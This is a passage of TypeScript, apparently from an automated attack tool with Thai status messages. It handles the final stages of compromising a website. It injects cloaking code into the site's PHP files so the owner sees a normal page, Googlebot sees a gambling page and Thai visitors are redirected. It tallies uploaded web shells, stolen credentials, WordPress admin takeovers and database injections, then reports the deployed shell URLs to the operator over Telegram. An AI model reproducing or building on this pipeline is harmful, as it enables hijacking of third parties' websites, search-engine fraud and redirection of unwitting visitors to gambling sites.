              detail: `✅ Inject สำเร็จ! ${injectionResult.injectedFiles.length} ไฟล์ PHP ถูก inject cloaking code — เจ้าของเว็บเห็นเว็บปกติ, Googlebot เห็น gambling page, คนไทยโดน redirect`,
              progress: 98,
              data: { injectedFiles: injectionResult.injectedFiles.length, files: injectionResult.injectedFiles },
            });
          } else {
            onEvent({
              phase: "cloaking",
              step: "injection",
              detail: `⚠️ Inject ไม่สำเร็จ — ไม่พบไฟล์ PHP ที่เขียนได้ หรือ shell ไม่รองรับ file_put_contents`,
              progress: 98,
            });
          }
        } catch (injErr: any) {
          onEvent({
            phase: "cloaking",
            step: "injection",
            detail: `⚠️ Injection ล้มเหลว: ${injErr.message}`,
            progress: 98,
          });
        }
      }

      onEvent({
        phase: "cloaking",
        step: "complete",
        detail: `✅ Cloaking สร้างเสร็จ — ${cloakingResult.type} + ${contentPack.doorwayPages.length} doorway pages${injectionResult?.injectedFiles ? ` + ${injectionResult.injectedFiles} files injected` : ""}${cdnUploadResult ? " + CDN hosted" : ""}`,
        progress: 99,
        data: {
          shellType: cloakingResult.type,
          internalPages: cloakingResult.internalPages.length,
          doorwayPages: contentPack.doorwayPages.length,
          contentSize: cloakingResult.content.length,
          injectedFiles: injectionResult?.injectedFiles?.length || 0,
          cdnUrl: cdnUploadResult?.contentKeyPrefix,
        },
      });
    } catch (error: any) {
      errors.push(`Cloaking generation failed: ${error.message}`);
      onEvent({
        phase: "cloaking",
        step: "error",
        detail: `⚠️ Cloaking ล้มเหลว: ${error.message} — ไฟล์ที่วางได้ยังใช้งานได้ปกติ`,
        progress: 99,
      });
    }
  } else if (config.enableCloaking !== false && !hasRealUploads) {
    const shelllessCount = uploadedFiles.filter(f => f.method.startsWith("shellless_")).length;
    onEvent({
      phase: "cloaking",
      step: "skipped",
      detail: `⏭️ Cloaking ข้าม — ไม่มีไฟล์ที่วางสำเร็จจริง${shelllessCount > 0 ? ` (มี ${shelllessCount} shellless results แต่ไม่มี active shell สำหรับ inject)` : ""}`,
      progress: 99,
    });
  }

  // ─── Emit final world state ───
  onEvent({
    phase: "world_update",
    step: "final",
    detail: "Final world state",
    progress: 99,
    data: {
      hosts: 1,
      ports: 0,
      vulns: (vulnScan?.misconfigurations?.length || 0) + (configResults?.filter(r => r.success).length || 0),
      creds: discoveredCredentials?.length || 0,
      uploadPaths: vulnScan?.writablePaths?.length || prescreen?.writablePaths?.length || 0,
      // Only count real uploaded shells (not shellless which don't place files)
      shellUrls: uploadedFiles.filter(f => f.verified && !f.method.startsWith("shellless_")).length,
      // deployedFiles = real uploads + shellless with confirmed redirect
      deployedFiles: uploadedFiles.filter(f => !f.method.startsWith("shellless_") || f.redirectWorks).length,
      verifiedUrls: uploadedFiles.filter(f => f.redirectWorks).length,
    },
  });

  // ─── Phase 5: Final Result ───
  const verifiedFiles = uploadedFiles.filter(f => f.verified);
  const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
  const destinationMatchFiles = uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
  // Separate real uploads from shellless for accurate success determination
  const realVerifiedFiles = verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
  const shelllessVerifiedFiles = verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks && f.redirectDestinationMatch);
  // Success = redirect works AND goes to the correct destination
  // "Partial success" = redirect works but goes to wrong destination (still counts as success but with warning)
  const fullSuccess = destinationMatchFiles.length > 0;
  const partialSuccess = !fullSuccess && redirectWorkingFiles.length > 0;
  const fileDeployed = !fullSuccess && !partialSuccess && realVerifiedFiles.length > 0;
  const success = fullSuccess || partialSuccess || fileDeployed;

  const result: PipelineResult = {
    success,
    targetUrl: config.targetUrl,
    redirectUrl: config.redirectUrl,
    prescreen,
    vulnScan,
    shellsGenerated: shells.length,
    uploadAttempts: totalAttempts,
    uploadedFiles,
    verifiedFiles,
    totalDuration: Date.now() - startTime,
    aiDecisions,
    errors,
    // Advanced attack results
    wafBypassResults: wafBypassResults.length > 0 ? wafBypassResults : undefined,
    altUploadResults: altUploadResults.length > 0 ? altUploadResults : undefined,
    indirectAttackResults: indirectResults.length > 0 ? indirectResults : undefined,
    dnsAttackResults: dnsResults.length > 0 ? dnsResults : undefined,
    configExploitResults: configResults.length > 0 ? configResults : undefined,
    originIp,
    discoveredCredentials: discoveredCredentials.length > 0 ? discoveredCredentials : undefined,
    // WP Admin Takeover & DB Injection results
    wpAdminResults: wpAdminResults.length > 0 ? wpAdminResults : undefined,
    wpDbInjectionResults: wpDbInjectionResults.length > 0 ? wpDbInjectionResults : undefined,
    // Shellless attack results
    shelllessResults: shelllessResults.length > 0 ? shelllessResults : undefined,
    // Cloaking results
    cloakingShell: cloakingResult || undefined,
    contentPack: contentPack || undefined,
    // Injection & CDN results
    injectionResult: injectionResult || undefined,
    cdnUploadResult: cdnUploadResult || undefined,
  };

  if (fullSuccess) {
    onEvent({
      phase: "complete",
      step: "success",
      detail: `🎉 Pipeline สำเร็จ! ${destinationMatchFiles.length} redirect(s) ไปยังปลายทางจริง → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl} (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else if (partialSuccess) {
    onEvent({
      phase: "complete",
      step: "partial",
      detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${redirectWorkingFiles.length} redirect(s) → ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl}) (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else if (fileDeployed) {
    onEvent({
      phase: "complete",
      step: "partial",
      detail: `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else {
    onEvent({
      phase: "complete",
      step: "failed",
      detail: `❌ Pipeline ล้มเหลว — ลอง ${totalAttempts} ครั้ง, ${shells.length} shells, ${errors.length} errors (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  }

  // ─── Telegram Notification (primary — no email) ───
  try {
    // Only show URLs that are actual deployed files (not target URL from shellless)
    const realDeployedUrls = uploadedFiles
      .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
      .map(f => f.url)
      .filter(url => url !== config.targetUrl); // Never show target URL as "deployed"
    // If only shellless with redirectWorks, show target URL with note
    const shelllessWithRedirect = uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const deployedUrls = realDeployedUrls.length > 0 
      ? realDeployedUrls 
      : shelllessWithRedirect.map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`);
    // Determine notification type based on destination match
    const notificationType = fullSuccess ? "success" as const
      : partialSuccess ? "partial" as const
      : fileDeployed ? "partial" as const
      : "failure" as const;
    const telegramPayload: TelegramNotification = {
      type: notificationType,
      targetUrl: config.targetUrl,
      redirectUrl: config.redirectUrl,
      deployedUrls,
      shellType: shells[0]?.type || "unknown",
      duration: result.totalDuration,
      errors: errors.slice(0, 5),
      keywords: config.seoKeywords,
      cloakingEnabled: config.enableCloaking !== false && !!cloakingResult,
      injectedFiles: injectionResult?.injectedFiles?.length || 0,
      details: fullSuccess
        ? `✅ ${destinationMatchFiles.length} redirect(s) → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl}, ${injectionResult?.injectedFiles?.length || 0} injected`
        : partialSuccess
        ? `⚠️ Redirect ทำงานแต่ไปผิดที่: ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl})`
        : fileDeployed
        ? `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`
        : `${totalAttempts} attempts, ${errors.length} errors`,
    };

    const telegramResult = await sendTelegramNotification(telegramPayload);
    result.telegramSent = telegramResult.success;
    result.emailSent = false; // Email disabled — Telegram only

    if (telegramResult.success) {
      onEvent({
        phase: "complete",
        step: "telegram",
        detail: `📱 Telegram แจ้งเตือนแล้ว`,
        progress: 100,
      });
    } else {
      onEvent({
        phase: "complete",
        step: "telegram",
        detail: `⚠️ Telegram ส่งไม่ได้`,
        progress: 100,
      });
    }
  } catch (telegramErr: any) {
    onEvent({
      phase: "complete",
      step: "telegram",
      detail: `⚠️ Telegram ส่งไม่ได้: ${telegramErr.message}`,
      progress: 100,
    });
  }

  return result;
}
